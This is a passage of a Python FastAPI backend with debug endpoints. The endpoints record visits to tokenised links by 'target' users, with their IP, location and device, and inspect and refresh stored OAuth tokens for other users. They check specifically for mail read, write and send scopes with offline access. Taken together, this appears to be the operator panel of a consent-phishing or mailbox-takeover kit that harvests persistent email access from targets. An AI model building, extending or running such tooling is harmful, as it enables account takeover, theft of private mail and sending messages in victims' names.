                    UrlVisit.admin_user_id == "",
                    UrlVisit.admin_user_id == None,
                )
            )
            .delete(synchronize_session=False)
        )
        db.commit()
        return {
            "message": f"Cleared {deleted} visit records",
            "deleted_count": deleted,
        }
    finally:
        db.close()


# =========================
# DEBUG ENDPOINTS
# =========================
@app.get("/debug/test-visit")
def debug_test_visit(request: Request):
    """
    Manually inserts a test visit record.
    No auth required — use this to verify the full
    visit recording pipeline is working end to end.
    """
    import traceback

    results = {
        "step_1_db_import": False,
        "step_2_model_import": False,
        "step_3_table_exists": False,
        "step_4_columns_exist": False,
        "step_5_insert": False,
        "step_6_query_back": False,
        "visit_id": None,
        "total_visits_in_db": None,
        "errors": [],
    }

    try:
        from db import SessionLocal, _table_exists, _column_exists
        results["step_1_db_import"] = True
    except Exception as e:
        results["errors"].append(f"Step 1 failed: {e}")
        return results

    try:
        from models import UrlVisit
        results["step_2_model_import"] = True
    except Exception as e:
        results["errors"].append(f"Step 2 failed: {e}")
        return results

    db = SessionLocal()

    try:
        from sqlalchemy import text
        with db.bind.connect() as conn:
            exists = _table_exists(conn, "url_visits")
            results["step_3_table_exists"] = exists
            if not exists:
                results["errors"].append(
                    "url_visits table does NOT exist. "
                    "init_db() may not have run or failed."
                )
    except Exception as e:
        results["errors"].append(f"Step 3 failed: {e}")

    try:
        required_cols = [
            "id", "target_user_id", "admin_user_id",
            "ip_address", "user_agent", "country", "city",
            "device_type", "browser", "os", "referrer",
            "url_type", "outcome", "visited_at", "created_at",
        ]
        missing_cols = []
        with db.bind.connect() as conn:
            for col in required_cols:
                if not _column_exists(conn, "url_visits", col):
                    missing_cols.append(col)

        results["step_4_columns_exist"] = len(missing_cols) == 0
        if missing_cols:
            results["errors"].append(
                f"Missing columns in url_visits: {missing_cols}"
            )
            results["missing_columns"] = missing_cols
    except Exception as e:
        results["errors"].append(f"Step 4 failed: {e}")

    try:
        ip = (
            request.headers.get("cf-connecting-ip")
            or request.headers.get("x-real-ip")
            or request.headers.get(
                "x-forwarded-for", ""
            ).split(",")[0].strip()
            or (
                request.client.host
                if request.client
                else "127.0.0.1"
            )
        )

        visit = UrlVisit(
            target_user_id="debug-test-user",
            admin_user_id="debug-admin",
            url_token="",
            ip_address=ip,
            user_agent=request.headers.get(
                "user-agent", ""
            )[:500],
            device_type="desktop",
            browser="Chrome",
            os="Windows",
            country="Test",
            city="Test City",
            referrer="",
            url_type="debug_test",
            outcome="test_insert",
            visited_at=int(time.time()),
            created_at=int(time.time()),
        )

        db.add(visit)
        db.commit()
        db.refresh(visit)

        results["step_5_insert"] = True
        results["visit_id"] = visit.id

    except Exception as e:
        results["errors"].append(
            f"Step 5 insert failed: {e}\n"
            f"{traceback.format_exc()}"
        )
        try:
            db.rollback()
        except Exception:
            pass

    try:
        count = db.query(UrlVisit).count()
        results["step_6_query_back"] = True
        results["total_visits_in_db"] = count
    except Exception as e:
        results["errors"].append(f"Step 6 failed: {e}")
    finally:
        try:
            db.close()
        except Exception:
            pass

    return results


@app.get("/debug/raw-visits")
def debug_raw_visits(user=Depends(verify_token)):
    """
    Returns ALL visits in the database regardless of
    admin_user_id. Use this to verify visits are being
    saved even if they are not showing in /visits.
    """
    db = SessionLocal()
    try:
        from sqlalchemy import text
        result = db.execute(
            text(
                "SELECT * FROM url_visits "
                "ORDER BY id DESC LIMIT 20"
            )
        )
        rows = result.fetchall()
        keys = result.keys()
        return {
            "total_in_db": len(rows),
            "your_admin_id": user["sub"],
            "note": (
                "If visits appear here but not in /visits "
                "then the admin_user_id filter is the problem."
            ),
            "visits": [
                dict(zip(keys, row)) for row in rows
            ],
        }
    except Exception as e:
        return {"error": str(e)}
    finally:
        db.close()


@app.get("/debug/token-info")
def debug_token_info(
    user_id: str,
    user=Depends(verify_token),
):
    """
    Decodes and inspects the stored access token for user_id.
    Shows scopes, expiry, identity, and diagnosis.
    """
    token_record = get_token(user_id)

    if not token_record:
        return JSONResponse(
            status_code=404,
            content={
                "status": "error",
                "error": f"No token found for {user_id}",
                "fix": "User must complete OAuth sign-in first.",
            },
        )

    result = {
        "status": "found",
        "user_id": user_id,
        "has_access_token": bool(
            getattr(token_record, "access_token", None)
        ),
        "has_refresh_token": bool(
            getattr(token_record, "refresh_token", None)
        ),
        "expires_at": getattr(token_record, "expires_at", None),
        "ip_address": getattr(token_record, "ip_address", None),
        "location": getattr(token_record, "location", None),
    }

    try:
        parts = token_record.access_token.split(".")
        if len(parts) >= 2:
            padding = "=" * (-len(parts[1]) % 4)
            payload = _json.loads(
                b64.urlsafe_b64decode(
                    parts[1] + padding
                ).decode("utf-8")
            )
            scopes = payload.get("scp", "")
            result["scopes"] = scopes
            result["scope_list"] = (
                scopes.split(" ") if scopes else []
            )
            result["has_mail_read"] = (
                "Mail.Read" in str(scopes)
            )
            result["has_mail_readwrite"] = (
                "Mail.ReadWrite" in str(scopes)
            )
            result["has_mail_send"] = (
                "Mail.Send" in str(scopes)
            )
            result["has_offline_access"] = (
                "offline_access" in str(scopes)
            )
            result["token_identity"] = payload.get("upn", "")

            missing = []
            if "Mail.Read" not in str(scopes):
                missing.append("Mail.Read")
            if "Mail.ReadWrite" not in str(scopes):
                missing.append("Mail.ReadWrite")
            if "Mail.Send" not in str(scopes):
                missing.append("Mail.Send")
            if "offline_access" not in str(scopes):
                missing.append("offline_access")

            if missing:
                result["diagnosis"] = (
                    f"PROBLEM: missing scopes: {missing}. "
                    f"User must re-authenticate."
                )
            else:
                result["diagnosis"] = (
                    "Token has all required Mail scopes. "
                    "If Graph calls still fail check that "
                    "graph.py uses this user token "
                    "with /me/ endpoints."
                )

    except Exception as e:
        result["decode_error"] = str(e)

    return result


@app.post("/debug/force-refresh")
def debug_force_refresh(
    user_id: str,
    user=Depends(verify_token),
):
    """
    Forces a token refresh for user_id.
    Use this to test whether the refresh token is working.
    """
    from auth import refresh_token as do_refresh

    token_record = get_token(user_id)

    if not token_record:
        return JSONResponse(
            status_code=404,
            content={
                "status": "error",
                "error": f"No token found for {user_id}",
                "fix": "User must complete OAuth sign-in first.",
            },
        )

    if not token_record.refresh_token:
        return JSONResponse(
            status_code=400,
            content={
                "status": "error",
                "error": "No refresh token available",
                "fix": (
                    "Token was issued without offline_access "
                    "scope. User must re-authenticate. "
                    "Ensure offline_access is in VISIBLE_SCOPES."
                ),
            },
        )

    try:
        result = do_refresh(user_id)
        return {
            "status": "refreshed",
            "user_id": user_id,
            "has_access_token": bool(
                result.get("access_token")
            ),
            "has_refresh_token": bool(
                result.get("refresh_token")
            ),
            "expires_in": result.get("expires_in"),
            "scope": result.get("scope"),
        }
    except Exception as e:
        return JSONResponse(
            status_code=400,
            content={
                "status": "failed",
                "user_id": user_id,
                "error": str(e),
                "fix": (
                    "Refresh token may be expired or revoked. "
                    "User must re-authenticate."
                ),
            },
        )